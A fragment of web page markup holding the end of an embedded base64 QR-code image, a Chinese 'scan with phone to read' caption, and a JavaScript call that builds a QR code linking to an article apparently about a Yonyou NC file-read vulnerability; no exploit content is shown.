3XrRPtB+q94fYUrz4qH9IZg9ZiF9RAfBPWqi/Lw3Kcf4gPuPw/5eLOvwyvk7HyQaepzyuYw12Hk9a/qYe6Hkbe+0J4dITXl2Ye+PVdr+Y6lVcjXusIcso95aRXmEB1GLI/x5YHY/MbvuYHDQGCcnts6QRHiUxfVzWHug/AQ1L9CiM/+4spfvB4R0gOCZ3z1mIV1Xes8jPvo7z75wsNAirzjdTdw+CzLo6ymCJm6PkgOQXlx1Welr/zykH3gOva97CW/wl+/8r//U4dxzxUP8XXdXPQcED9w/5T18WZf22dZTktcnVNd7D7ItOUhuX5I3nXzjtatePU96pWD+Z4QXp8I4SFoP7H7Oq8uqosw71v6/R5St/BGsb2HQKYG17B/D6unYcVb33XI/uow5vIiRAekNgQ+/7ZJ36PnW8HvRdchfX7LG3SfAsz96tbB0Xe/QrylN8FtIE7tDPu59cNx2t1buX4RUgfB8uxD357br9UL9/yVddVU6IWcAYLyX8XqWfHVuvJvA6nkjtffwGEgkKcDRrx61Hoy9nFWt/fWWn+tK8w7wng+eOR6q77CHB4eeKzVy7uPFQ+pVRchPIyofgUPA7lSdHu+7wb+eiCQp8EnC5J7ZBjzzkN0CKqLMPLuoz7DlWfF2wPGveRFiG4fGHN9or6er/Li/3og1eSO/+8Gvm0gMH96ILzfgk+RKC/Kw1in/gwhNTCiPa2F6PLwPLdOhPjNex/5Feov/LaBrDa/+ec3cBhITWkWqzZ6V/qf8jA+dfaBOV+6Z4F4zMXyXAn9kD69BsLrE7tvlUPqZ/phIDPTzf3cDWwDgUwNnuPqaJC61dMCo64PwkPQ/uo977x6IYw9iquAkYcxf9az6g0Y6zp/1gfGekgOD9wGYvMbX3sD90Bee/+H3f8FAAD//40m66gAAAAGSURBVAMAUHV90UQQK44AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacofile-down-fileread-delete.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 